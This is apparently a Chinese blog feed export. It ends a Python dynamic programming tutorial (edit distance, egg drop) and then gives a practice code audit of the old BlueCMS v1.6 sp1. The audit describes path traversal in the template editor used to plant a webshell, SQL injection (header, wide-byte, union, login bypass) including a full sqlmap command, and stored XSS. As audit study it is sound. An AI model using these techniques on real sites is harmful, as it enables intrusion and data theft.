    dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>
                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>
                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">]</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>随后还可以将步骤推出来：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    m <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span>
    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span>
    dp <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    a <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 记录每一步的操作 0：啥都不做，1：插入，2：替换，3：删除</span>
    dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    a<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i
        a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        dp<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> i
        a<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s2<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>  <span class="token comment"># 不动，也就是相同直接跳过 0</span>
                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># 插入 1</span>
                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token comment"># 替换 2</span>
                                 dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 删除 3</span>

            <span class="token keyword">if</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>
                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">elif</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>
                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">2</span>
            <span class="token keyword">elif</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">==</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>
                a<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">]</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>minDistance<span class="token punctuation">(</span><span class="token string">"apple"</span><span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>以上代码将输出：</p>
<pre class="language-none"><code class="language-none">033333
103333
112222
111222
4</code></pre>

<p>从后面往前推就行，0,2代表对角（跳过/替换），1代表向上（插入），3代表向左（删除）</p>
<p>寻找到0的最佳捷径就OK</p>
<h3 id="高楼扔鸡蛋"><a href="#高楼扔鸡蛋" class="headerlink" title="高楼扔鸡蛋"></a>高楼扔鸡蛋</h3><p>题目：</p>
<p>目前有一栋1到<code>N</code>共<code>N</code>层的楼，然后给你<code>K</code>鸡蛋（<code>K</code>至少为1），现在确定这栋楼存在楼层<code>0&lt;=F&lt;=N</code>,在这层楼将鸡蛋扔下去鸡蛋<strong>恰好没有碎</strong>（高于<code>F</code>的楼层都会碎，低于<code>F</code>的楼层都不会碎），现在问，最坏的情况下，你至少要扔多少次鸡蛋，才能确定这个楼层<code>F</code>？</p>
<h4 id="带备忘录的递归解法-3"><a href="#带备忘录的递归解法-3" class="headerlink" title="带备忘录的递归解法"></a>带备忘录的递归解法</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># K个鸡蛋,N层楼</span>
    memo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> K <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> N
    <span class="token keyword">if</span> N <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span> <span class="token keyword">in</span> memo<span class="token punctuation">:</span>
        <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span>
    res <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> <span class="token builtin">max</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span>K <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> main<span class="token punctuation">(</span>K<span class="token punctuation">,</span> N <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 在max最坏的情况下，求min最优解，main(K - 1, i - 1)表示碎了，main(K, N - i)表示没碎</span>
    memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> res
    <span class="token keyword">return</span> res


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<h4 id="二分法优化"><a href="#二分法优化" class="headerlink" title="二分法优化"></a>二分法优化</h4><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># K个鸡蛋,N层楼</span>
    memo <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> K <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> N
    <span class="token keyword">if</span> N <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span> <span class="token keyword">in</span> memo<span class="token punctuation">:</span>
        <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span>
    res <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>
    lo <span class="token operator">=</span> <span class="token number">1</span>
    hi <span class="token operator">=</span> N
    <span class="token keyword">while</span> lo <span class="token operator">&lt;=</span> hi<span class="token punctuation">:</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>lo <span class="token operator">+</span> hi<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        broken <span class="token operator">=</span> main<span class="token punctuation">(</span>K <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment"># 碎</span>
        not_broken <span class="token operator">=</span> main<span class="token punctuation">(</span>K<span class="token punctuation">,</span> N <span class="token operator">-</span> mid<span class="token punctuation">)</span>  <span class="token comment"># 没碎</span>
        <span class="token comment"># res = min(max(碎, 没碎) + 1)</span>
        <span class="token keyword">if</span> broken <span class="token operator">></span> not_broken<span class="token punctuation">:</span>
            hi <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>
            res <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> broken <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            lo <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
            res <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> not_broken <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
    memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> res
    <span class="token keyword">return</span> res

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>未完待续。。。</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>BlueCMS代码审计</title>
    <url>/posts/b7c1e15e/</url>
    <content><![CDATA[<p>“BlueCMS——第一款免费开源的专业地方门户系统，专注于地方门户的CMS！”  广告是这么打的</p>
<p>BlueCMS v1.6 sp1，一个很老的CMS了，2010年的，上面的漏洞也很多，作为一个代码审计萌新的我，开始来拿这个练练手还是不错的</p>
<span id="more"></span>

<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>在后台有一个模板管理的功能，可以编辑前端htm文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101051793.png" alt loading="lazy"></p>
<p>点击编辑抓包</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101241645.png" alt loading="lazy"></p>
<p>可以看到包含了文件，于是我们尝试修改编辑的文件，改为<code>../../ann.php</code>，放包后如下，可以修改</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101419641.png" alt loading="lazy"></p>
<p>随后直接写马连接即可，源码如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101729886.png" alt loading="lazy"></p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="X-Forwarded-For头注入"><a href="#X-Forwarded-For头注入" class="headerlink" title="X-Forwarded-For头注入"></a>X-Forwarded-For头注入</h4><p>首先看到留言系统后台代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415164807809.png" alt loading="lazy"></p>
<p>网站习惯性的把用户留言时的ip保存下来，在看看getip()这个函数怎么写的</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165228100.png" alt loading="lazy"></p>
<p>getenv()函数获取环境变量的值</p>
<ul>
<li>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</li>
<li>第二个X-Forwarded-For 这个东西可以通过HTTP请求头来修改。</li>
</ul>
<p>X-Forwarded-For明显可以伪造</p>
<p>抓包手工延时注入：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165848020.png" alt loading="lazy"></p>
<p>然后写脚本跑就可以了</p>
<p>sqlmap跑数据库：<code>python sqlmap.py -r 1.txt --dbs --batch --headers=&quot;X-Forwarded-For:1*&quot;</code></p>
<p>可以把数据全跑出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415171800746.png" alt loading="lazy"></p>
<h4 id="首页登录界面SQL注入"><a href="#首页登录界面SQL注入" class="headerlink" title="首页登录界面SQL注入"></a>首页登录界面SQL注入</h4><p>先随便注册一个用户名为root的账号，然后在抓包使用万能密码即可登录任意用户</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134357459.png" alt loading="lazy"></p>
<p>再来看看源码中是怎么写的</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134551779.png" alt loading="lazy"></p>
<p>只限制了管理员组的不能从前台登录，参数没经过任何的过滤。。。</p>
<h4 id="注册界面SQL注入"><a href="#注册界面SQL注入" class="headerlink" title="注册界面SQL注入"></a>注册界面SQL注入</h4><p>既然是注册界面就看肯定有插入数据到数据库中的操作，直接看源码</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414102814136.png" alt loading="lazy"></p>
<p>简单的进行了用户和密码的检测，但并起不到实际的作用，于是在email处尝试进行报错注入，单引号闭合的时候能够成功插入到数据库中并没有报错，于是推测使用了魔术方法对用户的输入进行了转义，而sql语句编码方法使用的gbk编码，于是在单引号前面加上%df构成宽字节注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414104343110.png" alt loading="lazy"></p>
<p>成功报错但并没有显示出错误信息，查看源代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041411035197.png" alt loading="lazy"></p>
<p>似乎只会报sql语法错误，而我们报错注入使用的是XPATH上的语法错误，所以并不会显示出来，于是尝试盲注试试，尝试后视乎并没有执行成功，而是报了错误，原因不明，后面再研究</p>
<p>另外此处还有一个sql注入漏洞，可以插入多行用户数据，并且在email出嵌入sql语句，用户名单引号用十六进制代替</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121232230.png" alt loading="lazy"></p>
<p>可见成功执行注入，在数据库中成功执行了语句</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121433047.png" alt loading="lazy"></p>
<h4 id="管理登录界面SQL注入"><a href="#管理登录界面SQL注入" class="headerlink" title="管理登录界面SQL注入"></a>管理登录界面SQL注入</h4><p>如下图，万能密码直接进了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416150916773.png" alt loading="lazy"></p>
<p>源码，无过滤</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416151154990.png" alt loading="lazy"></p>
<h4 id="ad-idSQL注入"><a href="#ad-idSQL注入" class="headerlink" title="ad_idSQL注入"></a>ad_idSQL注入</h4><p>直接看源码</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153522230.png" alt loading="lazy"></p>
<p>应该存在联合查询注入，随后在第七个字段找到注入点，成功获取数据库名，随后再接着查表列就行了</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153652959.png" alt loading="lazy"></p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="个人资料存储型xss"><a href="#个人资料存储型xss" class="headerlink" title="个人资料存储型xss"></a>个人资料存储型xss</h4><p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161529680.png" alt loading="lazy"></p>
<p>随后在个人界面和管理员用户界面完美弹窗，再看看数据库中的资料</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161646983.png" alt loading="lazy"></p>
<p>email和msn都嵌入了script代码，为啥其它的没用？因为表字段的长度只有那么长</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161908634.png" alt loading="lazy"></p>
<p>再看看代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415162022292.png" alt loading="lazy"></p>
<p>同样未经过过滤，这里还存在sql注入漏洞，就不写了。</p>
<h4 id="注册界面存储型xss"><a href="#注册界面存储型xss" class="headerlink" title="注册界面存储型xss"></a>注册界面存储型xss</h4><p>注册界面的验证有部分是放在前端进行验证的，也就是用js进行验证，可我们都知道，前端验证并不可靠，真正的验证应该做在后端才行，就比如这里的邮箱验证就放在前端</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414100621671.png" alt loading="lazy"></p>
<p>于是我们直接抓包绕过，并在email中注入恶意代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041410074329.png" alt loading="lazy"></p>
<p>随后只要前端能够看得到该用户的邮箱，就会执行该恶意代码，就比如管理员的用户列表界面</p>
<img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS代码审计/image-20200414101006315.png" style="zoom:80%;" loading="lazy">

<h4 id="发布新闻页面存储型XSS"><a href="#发布新闻页面存储型XSS" class="headerlink" title="发布新闻页面存储型XSS"></a>发布新闻页面存储型XSS</h4><p>先看下源码：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416113747952.png" alt loading="lazy"></p>
<p>content参数使用的是<code>filter_data</code>函数进行处理，而这个函数并没有过滤<code>img</code>标签，于是可以利用进行xss攻击</p>
